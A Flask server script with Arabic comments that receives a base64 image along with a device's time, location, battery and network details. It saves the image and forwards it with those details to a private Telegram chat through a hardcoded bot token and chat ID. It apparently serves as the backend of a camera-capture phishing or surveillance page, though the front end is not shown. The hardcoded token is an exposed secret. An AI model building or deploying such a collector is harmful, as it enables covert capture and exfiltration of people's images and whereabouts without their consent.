from flask import Flask, request, render_template
import base64
import requests
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8193478268:AAEZEDwzOBPbRRBMn2jfr402VJAZmQVokB0"
CHAT_ID = "7824932999"
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()  # كانت سابقا data = request.json
    # تعديل اضافة تحقق
    if not data or 'image' not in data or 'info' not in data:
        return "❌ البيانات غير مكتملة", 400
    # نهاية التعديل 
    image_data = data['image']
    info = data['info']

    header, encoded = image_data.split(",", 1)
    img_bytes = base64.b64decode(encoded)

    # حفظ الصورة بعد الإرسال
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"photo_{timestamp}.png"
    filepath = os.path.join("photos", filename)
    os.makedirs("photos", exist_ok=True)

    # إرسال الصورة إلى البوت
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    caption = (
        f"📸 لحظة موثقة\n"
        f"🕒 {info['time']}\n"
        f"📍 {info['location']}\n"
        f"🖥️ {info['device']}\n"
        f"🔋 {info['battery']}\n"
        f"📶 {info['network']}"
    )

    with open(filepath, "wb") as f:
        f.write(img_bytes)

    with open(filepath, "rb") as photo:
        requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})

    return "✅ تم الإرسال والحفظ"

# app.run(host='0.0.0.0', port=5000)
app.run(host='0.0.0.0', port=8080)
